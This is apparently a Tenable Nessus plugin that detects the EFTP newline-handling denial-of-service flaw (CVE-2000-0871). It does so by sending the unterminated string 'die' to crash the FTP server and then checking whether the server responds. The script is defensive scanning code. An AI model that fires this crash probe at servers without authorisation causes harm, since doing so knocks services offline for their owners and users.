#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10510);
 script_version("1.36");
 script_set_attribute(attribute:"plugin_modification_date", value:"2024/01/16");

 script_bugtraq_id(1677);
 script_cve_id("CVE-2000-0871");

 script_name(english:"EFTP Newline String Handling Remote DoS");
 script_summary(english:"Crashes the remote FTP server");

 script_set_attribute(attribute:"synopsis", value:
"The FTP server running on the remote host has a denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The version of EFTP running on the remote host has a denial of service
vulnerability. Sending data without a trailing carriage return causes
the service to crash.");
 script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2000/Sep/228");
 script_set_attribute(attribute:"solution", value:"Upgrade to EFTP 2.0.5.316 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:U/RL:O/RC:C");
 script_set_attribute(attribute:"cvss_score_source", value:"CVE-2000-0871");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/09/11");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/09/12");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_family(english:"FTP");

 script_copyright(english: "This script is Copyright (C) 2000-2024 and is owned by Tenable, Inc. or an Affiliate thereof.");

 script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

include("ftp_func.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (! soc) exit(1, "TCP connection failed to port "+port+".");

dbg::detailed_log(name:'ftp_func', src:SCRIPT_NAME, lvl:2, msg:"Getting the FTP banner.");
r = ftp_recv_line(socket:soc);
if(!r)
{
  close(soc);
  exit(1, "No answer from port "+port+".");
}

 send(socket:soc, data:"die");
 close(soc);

for (i = 0; i < 3; i ++)
{
 sleep(1);
 soc = open_sock_tcp(port);
 if (soc) break;
}

if (! soc)
{
  security_warning(port);
  exit(0);
}

r = ftp_recv_line(socket:soc, retry: 3);
ftp_close(socket: soc);

if (strlen(r) > 0) exit(0, "The FTP server on port "+port+" is still alive.");

soc = open_sock_tcp(port);
if (soc)
{
 r2 = ftp_recv_line(socket:soc, retry: 3);
 if (strlen(r2) > 0)
 {
  ftp_close(socket: soc);
  exit(0, "The FTP server on port "+port+" is still alive.");
 }
 else
  close(soc);
}

if (soc)
 security_warning(port:port, extra: '\nThe TCP port is still open but the server does not answer any more.\n');
else
  security_warning(port:port, extra: '\nThe TCP port is now closed.\n');
